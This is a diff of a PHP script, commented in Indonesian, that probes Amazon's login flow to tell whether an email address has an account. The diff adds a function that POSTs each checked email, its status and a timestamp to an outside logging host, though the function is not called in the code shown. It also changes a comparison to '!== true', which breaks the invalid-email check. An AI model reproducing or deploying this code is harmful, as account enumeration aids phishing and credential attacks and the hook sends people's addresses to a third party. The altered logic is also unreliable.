@@ -64,10 +64,11 @@ function checkAmazonEmail($email) {
     $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
 
+
     // Tentukan hasil pengecekan berdasarkan kondisi
     if (strpos($response, "ap_change_login_claim") !== false) {
         return "Valid";
-    } elseif (strpos($response, "We cannot find an account with that email address") !== false) {
+    } elseif (strpos($response, "We cannot find an account with that email address") !== true) {
         return "Invalid";
     } elseif ($http_code != 200) {
         return "Unknown (HTTP Error $http_code)";
@@ -76,13 +77,35 @@ function checkAmazonEmail($email) {
     }
 }
 
-// Mengambil email dari URL query parameter
-if (isset($_GET['email'])) {
-    $email = $_GET['email'];
-    // Panggil fungsi untuk mengecek email
-    $result = checkAmazonEmail($email);
-    echo $result;
-} else {
-    echo "Mo apa bosku";
-}
-?>
+// Fungsi untuk mencatat log ke server eksternal (misalnya, https://musaganteng.web.id/logs)
+	function logValidEmail($email, $status) {
+		$url = 'https://musaganteng.web.id/logs/logs.php';  // URL endpoint untuk mencatat log
+
+		// Data yang akan dikirimkan
+		$data = http_build_query([
+			'email' => $email,
+			'status' => $status,
+			'timestamp' => time()  // Menambahkan waktu sebagai informasi log
+		]);
+
+		// Kirim data log menggunakan cURL
+		$ch = curl_init();
+		curl_setopt($ch, CURLOPT_URL, $url);
+		curl_setopt($ch, CURLOPT_POST, true);
+		curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
+		curl_exec($ch);
+		curl_close($ch);
+	}
+
+	// Mengambil email dari URL query parameter
+	if (isset($_GET['email'])) {
+		$email = $_GET['email'];
+		// Panggil fungsi untuk mengecek email
+		$result = checkAmazonEmail($email);
+		echo $result;
+	} else {
+		echo "Mo apa bosku";
+	}
+	?>
